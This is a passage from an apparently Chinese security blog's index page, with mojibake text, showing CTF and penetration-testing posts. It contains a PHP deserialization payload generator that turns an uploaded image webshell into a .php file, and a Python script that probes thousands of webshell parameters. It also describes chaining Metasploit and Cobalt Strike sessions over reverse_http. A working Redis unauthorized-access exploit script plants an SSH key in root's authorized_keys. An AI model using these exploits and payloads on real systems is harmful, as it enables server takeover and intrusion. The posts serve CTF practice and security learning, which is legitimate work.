class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>=<span class="string">&quot;./upload/a0e8e2b0d70d8e34d1bd3b1452e39848/30a17ed2359586e474712c283fa27ffb.png&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;./upload/a0e8e2b0d70d8e34d1bd3b1452e39848/111.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>=<span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$p</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Profile();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> Register(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(serialize(<span class="variable">$b</span>)));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>ä¸Šä¼ å›¾ç‰‡é©¬</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAhWD.png" alt="6dAhWD.png"></p>
<p>åœ¨cookieçš„userå‚æ•°ä¸­å†™å…¥payload</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAIQH.png" alt="6dAIQH.png"></p>
<p>æ”¹åæˆåŠŸ</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dA5Se.png" alt="6dA5Se.png"></p>
<h1 id="smarthacker"><a href="#smarthacker" class="headerlink" title="smarthacker"></a>smarthacker</h1><p>è„šæœ¬ç¼–å†™</p>
<p>ç›´æ¥ä¸‹è½½å¤‡ä»½æ–‡ä»¶å¼€å§‹åˆ†æ</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dATOA.png" alt="6dATOA.png"></p>
<p>æ‰“å¼€åå‘ç°å¤§é‡ç–‘ä¼¼webshellï¼Œä½†æ˜¯å¤§éƒ½æ— æ³•åˆ©ç”¨ï¼Œç”±äºæ•°é‡é«˜è¾¾3000ä¸ªï¼Œé€ä¸ªåˆ†ææ˜¯ä¸å¯èƒ½çš„ï¼Œå› æ­¤åªèƒ½åˆ©ç”¨pythonè„šæœ¬æ„é€ è¯·æ±‚æµ‹è¯•webshellä¸­çš„å‚æ•°æ˜¯å¦å¯ç”¨</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dAOFf.png" alt="6dAOFf.png"></p>
<p>ç¼–å†™è„šæœ¬æµ‹è¯•</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">patternget=re.<span class="built_in">compile</span>(<span class="string">&quot;GET\[\&#x27;(.+?)\&#x27;\]&quot;</span>)</span><br><span class="line">patternpost=re.<span class="built_in">compile</span>(<span class="string">&quot;POST\[\&#x27;(.+?)\&#x27;\]&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">os.chdir(<span class="string">&#x27;D:\phpstudy_pro\WWW\ctf\src&#x27;</span>)</span><br><span class="line">files=os.listdir(<span class="string">&#x27;D:\phpstudy_pro\WWW\ctf\src&#x27;</span>)</span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>							</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span></span><br><span class="line">webshellname=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>():</span></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> files:</span><br><span class="line">        print(filename)</span><br><span class="line">        index=<span class="number">11</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            result=patternget.findall(<span class="built_in">str</span>(f.read()))</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">for</span> arg <span class="keyword">in</span> result:</span><br><span class="line">                index+=<span class="number">1</span></span><br><span class="line">                url=<span class="string">&#x27;http://127.0.0.1/ctf/src/%s?%s=echo 955682789;&#x27;</span> %(filename,arg)</span><br><span class="line">                r=session.get(url)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;955682789&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">&quot;webshell is %s:%s&quot;</span> %(filename,arg))</span><br><span class="line">                    webshellname=<span class="string">&quot;webshell is %s:%s&quot;</span> %(filename,arg)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>():</span></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> files:</span><br><span class="line">        print(filename)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            result=patternpost.findall(<span class="built_in">str</span>(f.read()))</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">for</span> arg <span class="keyword">in</span> result:</span><br><span class="line">                url=<span class="string">&#x27;http://127.0.0.1/ctf/src/%s&#x27;</span> %filename</span><br><span class="line">                data=&#123;arg:<span class="string">&#x27;echo 955682789;&#x27;</span>&#125;</span><br><span class="line">                r=session.post(url=url,data=data)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;955682789&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    print(<span class="string">&quot;webshell is %s:%s&quot;</span> %(filename,arg))</span><br><span class="line">                    webshellname=<span class="string">&quot;webshell is %s:%s&quot;</span> %(filename,arg)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#post()</span></span><br><span class="line">    get()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>æ‹¿åˆ°flag</p>
<p>[<img src="https://s3.ax1x.com/2021/03/13/6dESyj.png" alt="6dESyj.png"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-03-11T02:43:50.000Z" title="2021-03-11T02:43:50.000Z">2021-03-11</time>å‘è¡¨</span><span class="level-item"><time dateTime="2021-03-11T02:46:42.581Z" title="2021-03-11T02:46:42.581Z">2021-03-11</time>æ›´æ–°</span><span class="level-item">2 åˆ†é’Ÿè¯»å®Œ (å¤§çº¦251ä¸ªå­—)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/11/msf%E5%92%8Ccs%E8%81%94%E5%8A%A8/">msfå’Œcsè”åŠ¨</a></h1><div class="content"><h2 id="csæ´¾ç”Ÿç»™msf"><a href="#csæ´¾ç”Ÿç»™msf" class="headerlink" title="csæ´¾ç”Ÿç»™msf"></a>csæ´¾ç”Ÿç»™msf</h2><p>é…ç½®å¥½listenerï¼Œé€‰æ‹©Foreign HTTP</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6Y5Nxx"><img src="https://s3.ax1x.com/2021/03/11/6Y5Nxx.png" alt="6Y5Nxx.png"></a></p>
<p>ä½¿ç”¨csçš„spawnåŠŸèƒ½</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6Y5tR1"><img src="https://s3.ax1x.com/2021/03/11/6Y5tR1.png" alt="6Y5tR1.png"></a></p>
<p>msfè®¾ç½®payloadä¸º/windows/meterpreter/reverse_httpï¼Œipå’Œç«¯å£ä¸listenerä¸­çš„ä¸€è‡´ï¼Œä¸è¦ä½¿ç”¨64ä½çš„payloadï¼Œä¼šå‡ºç°é—®é¢˜ã€‚è¿™æ ·å³å¯æ¥æ”¶åˆ°æ´¾ç”Ÿè¿‡æ¥çš„session</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6Y5YGR"><img src="https://s3.ax1x.com/2021/03/11/6Y5YGR.png" alt="6Y5YGR.png"></a></p>
<h2 id="msfæ´¾ç”Ÿç»™cs"><a href="#msfæ´¾ç”Ÿç»™cs" class="headerlink" title="msfæ´¾ç”Ÿç»™cs"></a>msfæ´¾ç”Ÿç»™cs</h2><p>åªæœ‰meterpreterç±»å‹çš„sessionæ‰èƒ½æ´¾ç”Ÿç»™cs</p>
<p>ä½¿ç”¨msfä¸­çš„windows/local/payload_injectæ¨¡å—ï¼Œè®¾ç½®payloadä¸ºwindows/meterpreter/reverse_httpï¼Œipå’Œç«¯å£å¡«å†™csç›‘å¬çš„ipå’Œç«¯å£ï¼Œå†æŒ‡å®šã€‚è®¾ç½®iDisablePayloadHandlerä¸ºtrueï¼Œå› ä¸ºpayload_injectæ‰§è¡Œåä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„handlerï¼Œä½†æ˜¯æˆ‘ä»¬å·²ç»æœ‰äº†ä¸€ä¸ªï¼Œæ‰€ä»¥ä¸éœ€è¦å®ƒã€‚æ‰§è¡Œåå³å¯å†csä¸­çœ‹åˆ°ä¸Šçº¿çš„æœºå™¨ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6Y5Ji9"><img src="https://s3.ax1x.com/2021/03/11/6Y5Ji9.png" alt="6Y5Ji9.png"></a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-03-06T03:15:29.000Z" title="2021-03-06T03:15:29.000Z">2021-03-06</time>å‘è¡¨</span><span class="level-item"><time dateTime="2021-03-06T03:19:38.851Z" title="2021-03-06T03:19:38.851Z">2021-03-06</time>æ›´æ–°</span><span class="level-item">4 åˆ†é’Ÿè¯»å®Œ (å¤§çº¦663ä¸ªå­—)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/06/python%E7%BC%96%E5%86%99Redis%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/">pythonç¼–å†™Redisæ¼æ´æ£€æµ‹å’Œåˆ©ç”¨è„šæœ¬</a></h1><div class="content"><h1 id="pythonç¼–å†™Redisæ¼æ´æ£€æµ‹å’Œåˆ©ç”¨è„šæœ¬"><a href="#pythonç¼–å†™Redisæ¼æ´æ£€æµ‹å’Œåˆ©ç”¨è„šæœ¬" class="headerlink" title="pythonç¼–å†™Redisæ¼æ´æ£€æµ‹å’Œåˆ©ç”¨è„šæœ¬"></a>pythonç¼–å†™Redisæ¼æ´æ£€æµ‹å’Œåˆ©ç”¨è„šæœ¬</h1><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-6.0.8.tar.gz</span><br><span class="line"># tar xzf redis-6.0.8.tar.gz</span><br><span class="line"># cd redis-6.0.8</span><br><span class="line"># make</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œå®Œ make å‘½ä»¤åï¼Œredis-6.0.8 çš„ src ç›®å½•ä¸‹ä¼šå‡ºç°ç¼–è¯‘åçš„ redis æœåŠ¡ç¨‹åº redis-serverï¼Œè¿˜æœ‰ç”¨äºæµ‹è¯•çš„å®¢æˆ·ç«¯ç¨‹åº redis-cliï¼š</p>
<p>ä¸‹é¢å¯åŠ¨ redis æœåŠ¡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># cd src</span><br><span class="line"># .&#x2F;redis-server</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹redis.confï¼Œå…ˆæ³¨é‡Šæ‰bind 127.0.0.1è¿™ä¸€è¡Œï¼Œå…è®¸è¿œç¨‹ç™»é™†ï¼ŒåŒæ—¶å…³é—­ä¿æŠ¤æ¨¡å¼</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6nJBwD"><img src="https://s3.ax1x.com/2021/03/06/6nJBwD.png" alt="6nJBwD.png"></a></p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6nJDTe"><img src="https://s3.ax1x.com/2021/03/06/6nJDTe.png" alt="6nJDTe.png"></a></p>
<p>ä½¿ç”¨ä¿®æ”¹åçš„é…ç½®æ–‡ä»¶å¯åŠ¨</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># cd src</span><br><span class="line"># .&#x2F;redis-server ..&#x2F;redis.conf</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6nJ6fA"><img src="https://s3.ax1x.com/2021/03/06/6nJ6fA.png" alt="6nJ6fA.png"></a></p>
<h2 id="åˆ©ç”¨è¿‡ç¨‹"><a href="#åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="åˆ©ç”¨è¿‡ç¨‹"></a>åˆ©ç”¨è¿‡ç¨‹</h2><p>ä¿®æ”¹æ•°æ®åº“é»˜è®¤è·¯å¾„ä¸º/root/.sshï¼Œé»˜è®¤ç¼“å­˜æ–‡ä»¶ä¸ºauthorized.keysï¼ŒæŠŠç›®æ ‡ä¸»æœºç¼“å­˜çš„å…¬é’¥ä½œä¸ºvalueä¿å­˜åœ¨authorized.keysæ–‡ä»¶ä¸­ï¼Œè¿™æ ·å°±åœ¨æœåŠ¡å™¨ç«¯/root/.sshä¸‹ç”Ÿæˆäº†ä¸€ä¸ªæˆæƒçš„key</p>
<p>1.æœ¬åœ°ä¸»æœºç”Ÿæˆå¯†é’¥key</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6nJdOK"><img src="https://s3.ax1x.com/2021/03/06/6nJdOK.png" alt="6nJdOK.png"></a></p>
<p>2.åœ¨ç›®å½•/root/.sshä¸‹æŸ¥çœ‹ç”Ÿæˆç»“æœï¼Œå¹¶æŠŠå…¬é’¥å¯¼å…¥txtæ–‡ä»¶ä¸­</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;root&#x2F;.ssh</span><br><span class="line">ls</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; key.txt</span><br><span class="line">cat key.txt</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6nJ0eO"><img src="https://s3.ax1x.com/2021/03/06/6nJ0eO.png" alt="6nJ0eO.png"></a></p>
<p>3.æŠŠç”Ÿæˆçš„å…¬é’¥å¯¼å…¥Redisç¼“å­˜ä¸­</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;key.txt | redis-cli -h xx.xx.xx.xx</span><br></pre></td></tr></table></figure>



<p>4.è¿æ¥åˆ°ç›®æ ‡ä¸»æœºï¼Œæ›´æ”¹é…ç½®æ–‡ä»¶è·¯å¾„ä¸º/root/.sshï¼Œè®¾ç½®æ–‡ä»¶åç§°ä¸ºauthorized-keys</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h xx.xx.xx.xx</span><br><span class="line"></span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh</span><br><span class="line">Config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>



<p>5.sshè¿æ¥åˆ°ç›®æ ‡ä¸»æœº</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh xx.xx.xx.xx</span><br></pre></td></tr></table></figure>



<h2 id="ç¼–å†™pythonè„šæœ¬"><a href="#ç¼–å†™pythonè„šæœ¬" class="headerlink" title="ç¼–å†™pythonè„šæœ¬"></a>ç¼–å†™pythonè„šæœ¬</h2><p>githubåœ°å€ï¼š<a target="_blank" rel="noopener" href="https://github.com/sp4zcmd/SimpleRedisScanner">https://github.com/sp4zcmd/SimpleRedisScanner</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Usage</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;RedisScanner.py 127.0.0.1 key.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Scan</span>(<span class="params">ip</span>):</span></span><br><span class="line">    payload=<span class="string">&quot;\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a&quot;</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.settimeout(<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.connect((ip, <span class="number">6379</span>))</span><br><span class="line">        s.sendall(payload.encode())</span><br><span class="line">        recvdata=s.recv(<span class="number">1024</span>).decode()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;redis_version&#x27;</span> <span class="keyword">in</span> recvdata:</span><br><span class="line">            print(<span class="string">&#x27;[+] %s is vulnerable &#x27;</span> %ip)</span><br><span class="line">            <span class="comment">#print(recvdata)</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&#x27;[-] %s is not vulnerable &#x27;</span> %ip)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WriteSSHKeygen</span>(<span class="params">ip,sshkey</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = redis.StrictRedis(host=ip, port=<span class="number">6379</span>, db=<span class="number">0</span>, socket_timeout=<span class="number">2</span>)</span><br><span class="line">        r.flushall()</span><br><span class="line">        r.<span class="built_in">set</span>(<span class="string">&#x27;crackit&#x27;</span>, sshkey)</span><br><span class="line">        r.config_set(<span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;/root/.ssh/&#x27;</span>)</span><br><span class="line">        r.config_set(<span class="string">&#x27;dbfilename&#x27;</span>, <span class="string">&#x27;authorized_keys&#x27;</span>)</span><br><span class="line">        r.save()</span><br><span class="line">        print(<span class="string">&#x27;[+] Write SSHkeygen successful&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&#x27;[-] Write SSHkeygen Failed&#x27;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(sys.argv)==<span class="number">3</span>):</span><br><span class="line">        ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">        sshkeyfile=sys.argv[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(sshkeyfile, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                sshkey = f.read()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">&#x27;Read SSHkeygen Failed&#x27;</span>)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> Scan(ip):</span><br><span class="line">            WriteSSHKeygen(ip, sshkey)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        Usage()</span><br></pre></td></tr></table></figure>



<h2 id="è¿è¡Œæµ‹è¯•"><a href="#è¿è¡Œæµ‹è¯•" class="headerlink" title="è¿è¡Œæµ‹è¯•"></a>è¿è¡Œæµ‹è¯•</h2><p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6nJay6"><img src="https://s3.ax1x.com/2021/03/06/6nJay6.png" alt="6nJay6.png"></a></p>
<p>å†™å…¥æˆåŠŸ</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6nJgSI"><img src="https://s3.ax1x.com/2021/03/06/6nJgSI.png" alt="6nJgSI.png"></a></p>
<p>æˆåŠŸè¿æ¥</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/6nJ2lt"><img src="https://s3.ax1x.com/2021/03/06/6nJ2lt.png" alt="6nJ2lt.png"></a></p>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous is-invisible is-hidden-mobile"><a href="/page/0/">ä¸Šä¸€é¡µ</a></div><div class="pagination-next"><a href="/page/2/">ä¸‹ä¸€é¡µ</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link is-current" href="/">1</a></li><li><a class="pagination-link" href="/page/2/">2</a></li><li><a class="pagination-link" href="/page/3/">3</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/5e0ca597-42d5-4a53-a683-2e0dd44f5952.jpg" alt="Sp4z"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Sp4z</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">æ–‡ç« </p><a href="/archives"><p class="title">27</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">åˆ†ç±»</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">æ ‡ç­¾</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">å…³æ³¨æˆ‘</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">é“¾æ¥</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">æœ€æ–°æ–‡ç« </h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-04-08T05:12:57.000Z">2021-04-08</time></p><p class="title"><a href="/2021/04/08/2021-DASCTF%E4%B8%89%E6%9C%88%E8%B5%9Bweb%E6%80%BB%E7%BB%93/">2021 DASCTFä¸‰æœˆèµ›webæ€»ç»“</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-04-05T05:38:50.000Z">2021-04-05</time></p><p class="title"><a href="/2021/04/05/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">æ— åˆ—åæ³¨å…¥æ€»ç»“</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-04-04T14:02:52.000Z">2021-04-04</time></p><p class="title"><a href="/2021/04/04/ThinkPHP-v3-2-%EF%BC%88SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%89%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/">ThinkPHP v3.2.* ï¼ˆSQLæ³¨å…¥&amp;æ–‡ä»¶è¯»å–ï¼‰ååºåˆ—åŒ–å¤ç°</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-03-30T13:31:20.000Z">2021-03-30</time></p><p class="title"><a href="/2021/03/30/2020-%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%981/">2020 